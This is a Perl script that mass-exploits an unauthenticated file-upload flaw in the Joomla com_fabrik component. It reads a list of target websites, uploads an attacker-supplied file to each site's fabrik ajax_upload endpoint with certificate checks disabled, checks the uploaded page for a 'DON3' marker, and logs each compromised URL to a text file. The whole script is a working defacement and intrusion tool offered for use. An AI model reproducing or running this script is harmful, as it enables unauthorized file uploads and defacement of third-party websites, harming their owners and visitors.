#!/usr/bin/perl -w


use HTTP::Request;
use LWP::Simple;
use HTTP::Request;
use LWP::Simple;
use LWP::UserAgent;
use Win32::Console::ANSI;
use IO::Socket::INET;
use Term::ANSIColor;


if ($^O =~ /MSWin32/) {system("cls"); system("color A");
}else { system("clear"); }
print "    ######################################################################\n";
print "    #                                                                    #\n";

print color("bold Green"), "[+] Coded By: Kadd3chy_Tnx [+]\n";
print color("bold Green"), "[+] Email: moat3z.kadd3chy@gmail.com [+]\n";
print color("bold Green"), "[+] Hello Brother's :D [+]\n";
print color("bold Green"), "\n\n\t.Ex : perl $0  .\n\n";



   

print color("yellow"), "\n";
print color 'reset';
print color("bold Green"), " Put List Here --> ";
$opn=<STDIN>;
chomp $opn;
print color("yellow"), "\n";
print color 'reset';
print color("bold Green"), " Index Name --> ";
$index=<STDIN>;
chomp $index;

print color("yellow"), "\n";


open(tarrget,"$opn") or die "Put List Here :) \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
com_fabrik();
}


   sub com_fabrik($site){

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";



my $response = $ua->post( $url,Content_Type => 'form-data',Content => ["file" => ["$index"]]);

$fabrik="$site/$index";

$fabrikindex = $ua->get("$fabrik")->content;
if($fabrikindex =~/DON3/) {

print color 'reset';
print color("bold green"), "Inject Index : $fabrik [Succeed]\n";
open (TEXT, '>>hey.txt');
print TEXT "$fabrik\n";
close (TEXT);
print color 'reset';
}else{
print color 'reset';
print color("bold red"),"Not Vuln : $fabrik\n";
print color 'reset';

}
}


Exit